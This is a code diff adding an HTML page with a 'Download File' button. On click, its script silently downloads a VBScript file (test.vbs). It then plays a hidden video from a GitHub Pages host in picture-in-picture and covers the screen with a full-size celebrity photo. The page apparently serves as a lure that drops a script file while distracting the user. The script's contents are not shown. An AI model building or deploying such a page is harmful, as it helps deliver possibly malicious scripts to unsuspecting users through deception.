@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Download & PiP Video</title>
+</head>
+<body>
+    <button id="downloadBtn">Download File</button>
+    <video id="pipVideo" src="https://selebewsss.github.io/spofcenah2/ers.mp4" style="display: none;" playsinline></video>
+    <img id="coverImage" src="https://static.promediateknologi.id/crop/0x0:0x0/0x0/webp/photo/p2/230/2024/08/25/zee-jkt48-1045707026.jpg" style="display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; object-fit: cover;" />
+
+    <script>
+        document.getElementById('downloadBtn').addEventListener('click', function() {
+            // Download file
+            const a = document.createElement('a');
+            a.href = '/test.vbs';
+            a.download = 'test.vbs';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+
+            // Play video in PiP
+            const video = document.getElementById('pipVideo');
+            video.style.display = 'block';
+            video.play().then(() => {
+                if (document.pictureInPictureEnabled) {
+                    video.requestPictureInPicture().then(() => {
+                        document.getElementById('coverImage').style.display = 'block';
+                    });
+                }
+            }).catch(err => console.error('PiP error:', err));
+        });
+    </script>
+</body>
+</html>
